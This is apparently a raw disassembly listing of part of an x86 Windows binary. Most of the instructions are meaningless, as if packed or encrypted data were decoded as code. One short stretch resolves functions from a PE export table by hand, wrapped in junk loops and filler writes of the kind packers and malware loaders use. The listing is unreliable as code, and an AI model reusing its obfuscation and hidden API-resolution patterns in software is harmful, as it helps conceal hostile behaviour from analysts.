  414026:	mov    edx,DWORD PTR [ecx-0x4d3237c0]
  41402c:	ret    
  41402d:	aam    0xd1
  41402f:	xchg   edi,eax
  414030:	imul   ebx,DWORD PTR [esi+0x7],0x6532088b
  414037:	adc    dh,BYTE PTR [ebx]
  414039:	push   ecx
  41403a:	sub    BYTE PTR [ebx+edi*2+0x1ec48435],dh
  414041:	mov    WORD PTR [eax-0x5e],cs
  414044:	xor    eax,0x39c70526
  414049:	bound  ebx,QWORD PTR [ebx+0x574f99ba]
  41404f:	or     eax,0x7b2be82e
  414054:	iret   
  414055:	xor    edx,DWORD PTR gs:[edx+0x59]
  414059:	sub    DWORD PTR [eax],0xffffff96
  41405c:	shr    DWORD PTR [ecx+0x74354f97],1
  414062:	push   ecx
  414063:	push   ebp
  414064:	fadd   QWORD PTR [ebx-0x3753fa5a]
  41406a:	je     0x413fef
  41406c:	fsub   DWORD PTR [edi+0x4d2d317b]
  414072:	dec    ebx
  414073:	or     eax,0x452440ed
  414078:	ret    
  414079:	inc    edx
  41407a:	retf   
  41407b:	adc    ecx,DWORD PTR [ebx+0x6b]
  41407e:	fcomp  QWORD PTR [esi]
  414080:	sti    
  414081:	dec    ebp
  414082:	mov    bh,0x12
  414084:	leave  
  414085:	mov    ds:0x770976a5,eax
  41408a:	cmp    al,0xa9
  41408c:	out    0x58,eax
  41408e:	in     eax,0xa7
  414090:	das    
  414091:	data16 aas 
  414093:	xchg   esi,eax
  414094:	(bad)  
  414095:	mov    edi,0xbdd87657
  41409a:	or     eax,DWORD PTR [eax-0x7a]
  41409d:	mov    dl,0xbf
  41409f:	mov    esp,0xee9a7dbb
  4140a4:	xchg   ebx,esi
  4140a6:	out    dx,al
  4140a7:	xor    eax,0x5bc8e03b
  4140ac:	(bad)  
  4140ad:	sahf   
  4140ae:	add    al,0x5e
  4140b0:	dec    esp
  4140b1:	inc    edx
  4140b2:	(bad)  
  4140b3:	pop    edx
  4140b4:	xchg   esp,eax
  4140b5:	jmp    0x414063
  4140b7:	mov    gs,eax
  4140b9:	pop    ecx
  4140ba:	mov    dh,0xa9
  4140bc:	jmp    0x41403e
  4140be:	and    BYTE PTR [ecx-0x2a],cl
  4140c1:	dec    ebx
  4140c2:	data16 rcr BYTE PTR [ebx],cl
  4140c5:	jnp    0x414048
  4140c7:	hlt    
  4140c8:	push   es
  4140c9:	jle    0xd58c8a98
  4140cf:	ins    BYTE PTR es:[edi],dx
  4140d0:	sahf   
  4140d1:	add    eax,0xbe5db876
  4140d6:	jecxz  0x4140ef
  4140d8:	sti    
  4140d9:	cmp    DWORD PTR [ebp+0x2a],ebp
  4140dc:	cdq    
  4140dd:	inc    eax
  4140de:	icebp  
  4140df:	xor    cl,al
  4140e1:	stc    
  4140e2:	jo     0x4140f7
  4140e4:	loopne 0x41412e
  4140e6:	jno    0x41407f
  4140e8:	hlt    
  4140e9:	fbstp  TBYTE PTR [eax]
  4140eb:	or     BYTE PTR [edx+0x6284689d],dh
  4140f1:	add    edx,ebp
  4140f3:	in     al,0xf3
  4140f5:	sar    DWORD PTR [eax],0x19
  4140f8:	mov    esp,DWORD PTR [esp]
  4140fb:	(bad)  
  4140fd:	xchg   bl,al
  4140ff:	jecxz  0x414159
  414101:	jmp    0xd0bf:0xf2de0930
  414108:	jle    0x414152
  41410a:	fcmovne st,st(1)
  41410c:	repz jmp 0x4c50:0x85468aff
  414114:	ds stc 
  414116:	js     0x414136
  414118:	dec    ecx
  414119:	out    0x78,al
  41411b:	cmp    ecx,DWORD PTR [edx]
  41411d:	test   eax,0xad157a7
  414122:	add    DWORD PTR [edi],edi
  414124:	lahf   
  414125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414126:	cld    
  414127:	nop
  414128:	pop    edi
  414129:	cmp    esp,edi
  41412b:	test   al,0xfa
  41412d:	dec    ebx
  41412e:	ins    BYTE PTR es:[edi],dx
  41412f:	sar    DWORD PTR [ebx],1
  414131:	jmp    FWORD PTR [eax+0x3ea752fb]
  414137:	push   es
  414138:	inc    eax
  414139:	out    dx,al
  41413a:	(bad)  
  41413b:	scas   al,BYTE PTR es:[edi]
  41413c:	jno    0x414153
  41413e:	or     DWORD PTR [ebx+ecx*4-0x593898cd],esi
  414145:	xor    al,BYTE PTR [ebp+edi*1+0x78]
  414149:	jnp    0x414164
  41414b:	mov    ah,0x16
  41414d:	mov    dh,cl
  41414f:	ja     0x414137
  414151:	adc    eax,0xb28bb937
  414156:	hlt    
  414157:	imul   ebx,DWORD PTR [ebx-0x73],0x50
  41415b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41415c:	xchg   esi,eax
  41415d:	int    0x8b
  41415f:	inc    ebp
  414160:	in     al,dx
  414161:	and    DWORD PTR ds:0x42fdd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fdd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fdd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fdd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e66f
  41418b:	cmp    DWORD PTR ds:0x42fdd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fdd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e7ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fde9
  4141ba:	sbb    DWORD PTR ds:0x42fdd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fe05,0x42e813
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e7eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fe05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e80f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fddd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fddd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fddd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fddd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e673
  41423b:	cmp    DWORD PTR ds:0x42fddd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fddd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fddd,ecx
  414257:	cmp    DWORD PTR ds:0x42fddd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41426d
  414283:	mov    DWORD PTR [edi+0x707380e4],eax
  414289:	jo     0x414244
  41428b:	jle    0x4142fd
  41428d:	jo     0x414268
  41428f:	mov    al,ds:0x9ffea49f
  414294:	sbb    al,BYTE PTR [edi+0x3fb58580]
  41429a:	sub    edx,DWORD PTR [ebx]
  41429c:	lods   al,BYTE PTR ds:[esi]
  41429d:	sub    ecx,DWORD PTR [edx]
  41429f:	mov    cl,0xe8
  4142a1:	ret    
  4142a2:	cld    
  4142a3:	ret    0x9e9a
  4142a6:	push   DWORD PTR [edi-0x7f]
  4142a9:	mov    edi,0x9c183392
  4142ae:	mov    cl,0x1c
  4142b0:	pop    esi
  4142b1:	adc    DWORD PTR [edi+eax*8+0x52],0xffffff81
  4142b6:	inc    esp
  4142b7:	cwde   
  4142b8:	push   ss
  4142b9:	ins    BYTE PTR es:[edi],dx
  4142ba:	stc    
  4142bb:	sbb    al,0xde
  4142bd:	pop    eax
  4142be:	push   ds
  4142bf:	dec    ebx
  4142c0:	pop    esi
  4142c1:	or     cl,BYTE PTR [esi]
  4142c3:	pop    eax
  4142c4:	addr16 jbe 0x414313
  4142c7:	mov    ax,ds:0x79ab153e
  4142cd:	jae    0x4142dd
  4142cf:	mov    ebp,0x6e905f59
  4142d4:	out    0xa7,eax
  4142d6:	mov    esp,ecx
  4142d8:	mov    ecx,0x29c1b4d
  4142dd:	ins    BYTE PTR es:[edi],dx
  4142de:	mov    DWORD PTR [esi+0x48],ebx
  4142e1:	jae    0x41434d
  4142e3:	das    
  4142e4:	inc    edx
  4142e5:	and    BYTE PTR [edi-0x7929e810],dl
  4142eb:	out    dx,al
  4142ec:	repz xor al,0x6e
  4142ef:	mov    ebx,0x87a92ce
  4142f4:	stc    
  4142f5:	or     eax,0x22155b7d
  4142fa:	cmp    edi,ecx
  4142fc:	jb     0x4142d0
  4142fe:	call   0x74ab24ba
  414303:	out    dx,al
  414304:	inc    edi
  414305:	mov    edx,0x29ca0e8b
  41430a:	lods   eax,DWORD PTR ds:[esi]
  41430b:	cli    
  41430c:	jle    0x414361
  41430e:	sub    edi,eax
  414310:	and    eax,0x5f7e9862
  414315:	fsub   DWORD PTR [edi+edi*8-0x22]
  414319:	mov    al,ds:0x3e9ab66e
  41431e:	sbb    BYTE PTR [edi-0x7fce0b59],dl
  414324:	out    dx,al
  414325:	imul   eax,DWORD PTR [esi-0xbaea07e],0xffffffc5
  41432c:	jns    0x414374
  41432e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432f:	repz pop edx
  414331:	mov    cl,0x8e
  414333:	cmp    al,0x2a
  414335:	mov    ecx,0x8262a45c
  41433a:	pop    ecx
  41433b:	ret    0x3e42
  41433e:	(bad)  
  41433f:	in     eax,dx
  414340:	adc    ch,BYTE PTR [edx-0x5fd4567e]
  414346:	test   ch,ah
  414348:	inc    ecx
  414349:	or     BYTE PTR [edi-0x4c],ah
  41434c:	dec    ebx
  41434d:	add    eax,0x96638993
  414352:	xchg   DWORD PTR [ebp+0x332daa54],esi
  414358:	mov    edi,0x7bbeb685
  41435d:	fstp   TBYTE PTR [edi+0x8]
  414360:	fcmovb st,st(5)
  414362:	ror    BYTE PTR [edi+0x453a5726],cl
  414368:	xchg   cl,al
  41436a:	dec    ecx
  41436b:	or     cl,cl
  41436d:	or     al,0xdb
  41436f:	mov    bl,0xfc
  414371:	repz loopne 0x4143c5
  414374:	ins    DWORD PTR es:[edi],dx
  414375:	push   0x40
  414377:	cs adc ebx,esp
  41437a:	add    bl,ch
  41437c:	leave  
  41437d:	aaa    
  41437e:	dec    esi
  41437f:	mov    bh,0x9b
  414381:	cmp    esp,DWORD PTR [ebp+ebx*4+0x0]
  414385:	loope  0x41438e
  414387:	(bad)  
  41438b:	jb     0x4143c5
  41438d:	push   ss
  41438e:	ret    
  41438f:	mov    dl,BYTE PTR [edx+0x66aaf753]
  414395:	imul   ebx,DWORD PTR [edx-0x4736efa8],0x5b
  41439c:	enter  0x534c,0xc5
  4143a0:	inc    esp
  4143a1:	mov    eax,0x66fa1ed2
  4143a6:	push   0x59
  4143a8:	rol    BYTE PTR [eax],cl
  4143aa:	mov    ebp,0x36831f15
  4143af:	sar    BYTE PTR [ecx+0x76],cl
  4143b2:	add    eax,0xca11e093
  4143b7:	in     eax,0x50
  4143b9:	cdq    
  4143ba:	add    BYTE PTR [esi],0x7b
  4143bd:	scas   eax,DWORD PTR es:[edi]
  4143be:	adc    dh,bl
  4143c0:	call   0xc607:0xc4a9a732
  4143c7:	bound  edx,QWORD PTR [edx+0x11]
  4143ca:	push   ss
  4143cb:	sub    al,0x31
  4143cd:	dec    edx
  4143ce:	xchg   ebp,eax
  4143cf:	add    edx,DWORD PTR [edx+esi*2-0x24]
  4143d3:	mov    al,0x95
  4143d5:	dec    ebx
  4143d6:	popf   
  4143d7:	imul   BYTE PTR [esi-0xf]
  4143da:	rol    BYTE PTR [ecx-0x1],cl
  4143dd:	popa   
  4143de:	or     eax,esp
  4143e0:	arpl   WORD PTR [eax-0xf],ax
  4143e3:	mov    eax,ds:0x553b751
  4143e8:	mov    WORD PTR [eax-0x43],ss
  4143eb:	inc    DWORD PTR [eax+0x4f1a4866]
  4143f1:	(bad)  
  4143f3:	fs mov eax,0x89474f33
  4143f9:	dec    eax
  4143fa:	mov    edi,0x94723302
  4143ff:	cmp    bh,BYTE PTR [ebp+edi*4-0x5]
  414403:	add    bh,ch
  414405:	aaa    
  414406:	imul   ecx,ebp,0xeacadaf3
  41440c:	clc    
  41440d:	dec    ebp
  41440e:	push   ebp
  41440f:	int3   
  414410:	lods   al,BYTE PTR ds:[esi]
  414411:	xor    ecx,DWORD PTR [edx-0x3e]
  414414:	test   eax,0xd9e5705c
  414419:	jae    0x4143f9
  41441b:	or     BYTE PTR [edi-0x6f],al
  41441e:	add    eax,DWORD PTR [ecx]
  414420:	(bad)  
  414421:	fmul   QWORD PTR ds:0x8251fd5f
  414427:	psllw  mm7,mm2
  41442a:	push   ds
  41442b:	jae    0x41442d
  41442d:	mov    ds:0x7be20bc5,al
  414432:	xor    eax,0x26505c65
  414437:	push   ds
  414438:	stos   DWORD PTR es:[edi],eax
  414439:	je     0x414479
  41443b:	sahf   
  41443c:	retf   
  41443d:	push   ebp
  41443e:	rcr    al,0xd
  414441:	out    dx,al
  414442:	mov    ecx,0x35e358a
  414447:	adc    al,0x79
  414449:	cmc    
  41444a:	mov    DWORD PTR [edi-0x61],0x4a34d8e8
  414451:	stos   BYTE PTR es:[edi],al
  414452:	cwde   
  414453:	imul   esi,DWORD PTR [edx],0x72
  414456:	int3   
  414457:	clc    
  414458:	fild   WORD PTR [ebx]
  41445a:	xlat   BYTE PTR ds:[ebx]
  41445b:	mov    cl,0x31
  41445d:	and    DWORD PTR [esi+0x5e],esp
  414460:	icebp  
  414461:	adc    DWORD PTR [esi],0x12
  414464:	or     BYTE PTR [esi-0x218145c5],bh
  41446a:	mov    dh,0x73
  41446c:	mov    al,0xb0
  41446e:	div    DWORD PTR [ebx+ecx*1]
  414471:	adc    ah,BYTE PTR [eax+0x4a96680b]
  414477:	cmp    ah,BYTE PTR [edx+0x13]
  41447a:	arpl   WORD PTR [ebx],dx
  41447c:	xchg   ebx,eax
  41447d:	add    ah,BYTE PTR [edi]
  41447f:	popf   
  414480:	leave  
  414481:	mov    ebx,0xb33adafb
  414486:	add    esp,DWORD PTR [esi]
  414488:	imul   edi,DWORD PTR [edx-0x68],0xe75b864b
  41448f:	jo     0x414509
  414491:	sahf   
  414492:	push   ss
  414493:	cs pop ds
  414495:	pop    esp
  414496:	xchg   DWORD PTR ds:0xdcc2b43a,ebx
  41449c:	jmp    0x41447c
  41449e:	inc    esp
  41449f:	jb     0x4144d7
  4144a1:	push   eax
  4144a2:	adc    esp,DWORD PTR [edi-0x13]
  4144a5:	or     ah,BYTE PTR [ebx+0x5a]
  4144a8:	add    ebx,edi
  4144aa:	arpl   sp,dx
  4144ac:	test   BYTE PTR [ebx-0x218a0e92],ah
  4144b2:	inc    edi
  4144b3:	hlt    
  4144b4:	xchg   esi,eax
  4144b5:	jae    0x41450d
  4144b7:	mov    esp,0x1573612c
  4144bc:	js     0x414509
  4144be:	push   edx
  4144bf:	mov    DWORD PTR [bx+0x35a5],esi
  4144c4:	xchg   edx,eax
  4144c5:	fst    QWORD PTR [ebp+0x34]
  4144c8:	in     al,0x30
  4144ca:	xchg   esp,eax
  4144cb:	add    ecx,edi
  4144cd:	cmp    bl,0x1c
  4144d0:	ja     0x41453b
  4144d2:	clc    
  4144d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144d4:	add    DWORD PTR [ecx],ebx
  4144d6:	mov    ds:0xbc498b81,eax
  4144db:	lock xor dl,ah
  4144de:	nop
  4144df:	(bad)  
  4144e0:	mov    esp,0xc2a97223
  4144e5:	add    BYTE PTR [eax],0x37
  4144e8:	in     al,0x24
  4144ea:	cmp    ch,BYTE PTR [ecx]
  4144ec:	xor    eax,0x9917583d
  4144f1:	call   DWORD PTR [edx+edx*8]
  4144f4:	mov    edi,0x4ac97184
  4144f9:	cwde   
  4144fa:	in     al,dx
  4144fb:	pop    edx
  4144fc:	dec    esi
  4144fd:	fcom   DWORD PTR [ecx-0x29]
  414500:	lods   eax,DWORD PTR ds:[esi]
  414501:	cmp    BYTE PTR [esi+eiz*1+0x57],ch
  414505:	mov    al,0xcc
  414507:	inc    edi
  414508:	sub    eax,0x1519fda6
  41450d:	test   esp,esp
  41450f:	fidiv  WORD PTR [esi+esi*2]
  414512:	mov    bl,0xb9
  414514:	inc    edx
  414515:	push   ss
  414516:	jle    0x4144c6
  414518:	cli    
  414519:	ins    DWORD PTR es:[edi],dx
  41451a:	sub    ebp,DWORD PTR [edi-0xae02a8a]
  414520:	aas    
  414521:	mov    ds:0x481264d1,eax
  414526:	or     cl,BYTE PTR [esp+0x536cbce5]
  41452d:	adc    DWORD PTR [eax-0x3b802bc7],0xd58b545a
  414537:	mov    dh,0x82
  414539:	inc    ebp
  41453a:	sti    
  41453b:	loopne 0x4144d7
  41453d:	loop   0x414537
  41453f:	mov    bl,0x36
  414541:	mov    eax,0xc9cd74a7
  414546:	ja     0x41458c
  414548:	sub    DWORD PTR [ecx-0x17],esp
  41454b:	mov    dh,0x81
  41454d:	xor    al,0xc5
  41454f:	loopne 0x41453c
  414551:	mov    esi,0xff752b4e
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xc1e2beb4
  414576:	fwait
  414577:	(bad)
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145aa
  414581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414582:	add    ebx,DWORD PTR [edi-0x1f]
  414585:	xlat   BYTE PTR ds:[ebx]
  414586:	clc    
  414587:	aam    0x74
  414589:	xchg   ebp,eax
  41458a:	jo     0x414551
  41458c:	adc    al,0xa3
  41458e:	inc    edx
  41458f:	repnz outs dx,BYTE PTR ds:[esi]
  414591:	lahf   
  414592:	push   edi
  414593:	in     al,0x3e
  414595:	jge    0x414573
  414597:	retf   
  414598:	dec    esp
  414599:	cmp    al,0x9f
  41459b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41459c:	inc    ebp
  41459d:	mov    esp,ecx
  41459f:	cmp    eax,ebp
  4145a1:	lahf   
  4145a2:	or     esp,DWORD PTR [ecx+0x61]
  4145a5:	scas   eax,DWORD PTR es:[edi]
  4145a6:	jl     0x414578
  4145a8:	and    ebp,DWORD PTR [esi+0x48]
  4145ab:	ja     0x4145b5
  4145ad:	int3   
  4145ae:	or     cl,BYTE PTR [edi]
  4145b0:	jecxz  0x4145e8
  4145b2:	out    dx,eax
  4145b3:	adc    eax,0xbe00788c
  4145b8:	cwde   
  4145b9:	sqrtps xmm3,XMMWORD PTR [esi+0x9a51c]
  4145c0:	cdq    
  4145c1:	xor    DWORD PTR [eax+ecx*2-0x50],esi
  4145c5:	and    eax,0x38b8e19d
  4145ca:	ins    BYTE PTR es:[edi],dx
  4145cb:	dec    ebp
  4145cc:	xchg   esi,eax
  4145cd:	dec    eax
  4145ce:	icebp  
  4145cf:	arpl   WORD PTR [ecx+eiz*8],dx
  4145d2:	(bad)  
  4145d3:	in     al,0x31
  4145d5:	outs   dx,DWORD PTR ds:[esi]
  4145d6:	inc    ecx
  4145d7:	or     dh,BYTE PTR [edx]
  4145d9:	jge    0x41464f
  4145db:	mov    ebp,0x1b8d35ab
  4145e0:	leave  
  4145e1:	outs   dx,BYTE PTR ds:[esi]
  4145e2:	push   edi
  4145e3:	loop   0x414622
  4145e5:	inc    ebp
  4145e6:	adc    eax,0x180aacb5
  4145eb:	fwait
  4145ec:	xchg   ebp,eax
  4145ed:	push   ds
  4145ee:	and    DWORD PTR [esi],0xffffffbf
  4145f1:	jle    0x41464a
  4145f3:	cmc    
  4145f4:	xchg   edx,eax
  4145f5:	fnstenv [edi+edi*4-0x61b34c77]
  4145fc:	pusha  
  4145fd:	(bad)  
  4145fe:	cwde   
  4145ff:	retf   
  414600:	inc    esi
  414601:	dec    ecx
  414602:	fnsave [edi-0x7fd27b0b]
  414608:	sub    BYTE PTR [esi-0xe],ch
  41460b:	cmp    bl,BYTE PTR [edx+0x1704a410]
  414611:	imul   ebp,esp,0xe1f1d660
  414617:	int3   
  414618:	ja     0x4145ea
  41461a:	push   ebx
  41461b:	add    esi,DWORD PTR [edx]
  41461d:	cmp    al,0x30
  41461f:	mov    eax,0x7d0882c7
  414624:	mov    cl,0x5e
  414626:	xchg   DWORD PTR [eax-0x54439893],edx
  41462c:	adc    eax,0xab4b913d
  414631:	xor    ecx,DWORD PTR [ebp-0x60e459fe]
  414637:	mov    eax,ds:0x245eb9f1
  41463c:	fcom   st(3)
  41463e:	mov    DWORD PTR [edx-0x39],esp
  414641:	outs   dx,BYTE PTR ds:[esi]
  414642:	mov    ch,0x8b
  414644:	xchg   ebx,eax
  414645:	imul   ebp,ecx,0x10
  414648:	das    
  414649:	data16 mov cl,0xcd
  41464c:	xor    eax,0x4ce43922
  414651:	cs mov esp,0x52d7da2
  414657:	cmp    eax,0xf2658f25
  41465c:	jnp    0x414654
  41465e:	sbb    dh,BYTE PTR [edi-0x6bbc9667]
  414664:	sub    BYTE PTR [edi+0x4c],0x18
  414668:	jp     0x4145fa
  41466a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466b:	enter  0x5e5a,0x39
  41466f:	clc    
  414670:	(bad)  
  414671:	cmp    ebp,esi
  414673:	aas    
  414674:	ret    0x6a38
  414677:	or     BYTE PTR [edx+0x6c597e12],ah
  41467d:	xchg   BYTE PTR [eax+0x35],bh
  414680:	adc    BYTE PTR [edx],0x9a
  414683:	xor    DWORD PTR [edi],esi
  414685:	(bad)  
  414686:	clc    
  414687:	jne    0x414659
  414689:	sub    BYTE PTR [ebx],0x2e
  41468c:	mov    ch,0x7a
  41468e:	mov    eax,ds:0xb31958ba
  414693:	adc    al,0x6a
  414695:	stc    
  414696:	repnz mov eax,ds:0x5480013b
  41469c:	push   ss
  41469d:	push   ecx
  41469e:	mov    bh,0xab
  4146a0:	mov    bp,WORD PTR [eax+0x36]
  4146a4:	rcl    ah,cl
  4146a6:	push   ds
  4146a7:	dec    ebx
  4146a8:	test   al,0x86
  4146aa:	(bad)  
  4146ab:	push   eax
  4146ac:	fsubr  QWORD PTR [eax+ecx*4+0x9]
  4146b0:	ins    BYTE PTR es:[edi],dx
  4146b1:	jnp    0x414680
  4146b3:	fsub   st,st(0)
  4146b5:	retf   0xd546
  4146b8:	sub    DWORD PTR [ecx],ebx
  4146ba:	sub    eax,0x11758cba
  4146bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146c0:	test   al,0x5b
  4146c2:	sbb    dh,BYTE PTR [ebx-0x35]
  4146c5:	sub    cl,0x4c
  4146c8:	jge    0x4146d6
  4146ca:	aad    0x4d
  4146cc:	push   ss
  4146cd:	jnp    0x414736
  4146cf:	shr    DWORD PTR [esi],1
  4146d1:	mov    eax,ds:0xe791ebe7
  4146d6:	cdq    
  4146d7:	or     eax,0x23f13b73
  4146dc:	mov    bh,0x23
  4146de:	and    DWORD PTR [ebp+eax*4-0x43fa1f02],ecx
  4146e5:	cmp    BYTE PTR [edx+0xb],ah
  4146e8:	push   0xffffffab
  4146ea:	outs   dx,WORD PTR ds:[esi]
  4146ec:	dec    ebp
  4146ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ee:	nop
  4146ef:	add    DWORD PTR [edx-0x6],0xfffffff3
  4146f3:	or     DWORD PTR [esi-0x9e0e19d],eax
  4146f9:	fisub  DWORD PTR [eax+edi*4-0x58]
  4146fd:	jg     0x4146df
  4146ff:	fwait
  414700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414701:	mov    ebp,DWORD PTR [esi]
  414703:	jbe    0x4146ab
  414705:	inc    edx
  414706:	dec    esi
  414707:	ins    BYTE PTR es:[edi],dx
  414708:	jae    0x4146ef
  41470a:	dec    ebx
  41470b:	lods   al,BYTE PTR ds:[si]
  41470d:	pop    DWORD PTR [eax]
  41470f:	sti    
  414710:	jmp    0x41478c
  414712:	mul    BYTE PTR [edi]
  414714:	retf   
  414715:	mov    ah,0x80
  414717:	add    al,0x70
  414719:	inc    esp
  41471a:	xor    eax,0xc18b9e72
  41471f:	or     al,0x7a
  414721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414722:	jae    0x414701
  414724:	dec    DWORD PTR [edx-0x6d880591]
  41472a:	test   ecx,ebx
  41472c:	and    ah,BYTE PTR [eax+eiz*2]
  41472f:	sbb    dl,BYTE PTR [eax+0x22]
  414732:	test   DWORD PTR [edi+0x5f],edx
  414735:	mov    edx,0xbd8875c7
  41473a:	fadd   DWORD PTR [esi+ebx*1]
  41473d:	rcr    DWORD PTR [edi],cl
  41473f:	jg     0x414754
  414741:	xor    bh,BYTE PTR [edx]
  414743:	dec    eax
  414744:	jno    0x414757
  414746:	mov    ds:0x4fcc657b,eax
  41474b:	in     al,0x79
  41474d:	dec    edi
  41474e:	pusha  
  41474f:	pop    ecx
  414750:	inc    edi
  414751:	sbb    ebx,DWORD PTR [ecx+ebp*4-0x13]
  414755:	jmp    0x6b2145ac
  41475a:	outs   dx,BYTE PTR ds:[esi]
  41475b:	std    
  41475c:	and    al,0x2c
  41475e:	popa   
  41475f:	xor    ah,bh
  414761:	jge    0x4147a8
  414763:	mov    ecx,0x3ae34f0e
  414768:	mov    bl,0xff
  41476a:	int3   
  41476b:	mov    edx,0x9f77feb9
  414770:	adc    esi,DWORD PTR [edx-0x67d465f2]
  414776:	and    BYTE PTR [esi+0x69],al
  414779:	lock gs pop eax
  41477c:	sbb    esi,0xffffffa0
  41477f:	add    DWORD PTR [esi],ecx
  414781:	inc    ebx
  414782:	enter  0x5519,0x3c
  414786:	iret   
  414787:	daa    
  414788:	out    dx,al
  414789:	xlat   BYTE PTR ds:[ebx]
  41478a:	and    DWORD PTR [esi-0x39],ebp
  41478d:	fwait
  41478e:	shl    DWORD PTR [edx+edx*1-0x46],cl
  414792:	jne    0x4147b5
  414794:	fld    QWORD PTR [ebx-0x21]
  414797:	xchg   ebx,eax
  414798:	int    0x65
  41479a:	xchg   edx,eax
  41479b:	cmp    BYTE PTR [edi],bl
  41479d:	inc    eax
  41479e:	jmp    0xcb1e:0xba8f166f
  4147a5:	mov    si,0x5d04
  4147a9:	adc    al,BYTE PTR [esi-0x73]
  4147ac:	aas    
  4147ad:	or     eax,0xfdf03afb
  4147b2:	jmp    0xd5a5:0x1a70a206
  4147b9:	rcl    BYTE PTR [ebx+0x34],1
  4147bc:	mov    cl,0x9e
  4147be:	dec    edx
  4147bf:	loope  0x41482a
  4147c1:	xor    al,BYTE PTR [esi]
  4147c3:	cs scas al,BYTE PTR es:[edi]
  4147c5:	lds    eax,FWORD PTR [ebx+0x2c]
  4147c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147c9:	test   DWORD PTR [ecx-0x53946701],ebp
  4147cf:	icebp  
  4147d0:	mov    eax,0x96bbd41e
  4147d5:	xor    DWORD PTR [eax-0x690b0f10],esi
  4147db:	xchg   ebp,eax
  4147dc:	arpl   WORD PTR [ecx+0x5a3a9ef6],di
  4147e2:	or     al,0x6a
  4147e4:	sub    al,0xd5
  4147e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147e7:	push   esp
  4147e8:	imul   edi,ebx,0x60
  4147eb:	inc    esp
  4147ec:	imul   esi,DWORD PTR [esi+ebx*8],0x7d990613
  4147f3:	pusha  
  4147f4:	fcom   DWORD PTR [edx+0x5a]
  4147f7:	and    eax,0x44e1515
  4147fc:	and    BYTE PTR [eax-0xc],ah
  4147ff:	jl     0x414788
  414801:	imul   ecx,DWORD PTR [eax],0x14813d27
  414807:	rcl    BYTE PTR [edi],0xcc
  41480a:	adc    eax,eax
  41480c:	add    al,0xa0
  41480e:	call   0x5a74fe91
  414813:	(bad)  
  414815:	mov    ebp,0x3cce026f
  41481a:	xor    eax,0xefe571a6
  41481f:	sti    
  414820:	adc    ecx,ebp
  414822:	pop    edx
  414823:	mov    BYTE PTR [edx-0x132af153],dl
  414829:	out    dx,al
  41482a:	jl     0x41485d
  41482c:	stos   DWORD PTR es:[edi],eax
  41482d:	sub    dl,cl
  41482f:	out    0xd7,al
  414831:	mov    ah,0xb3
  414833:	jle    0x414886
  414835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
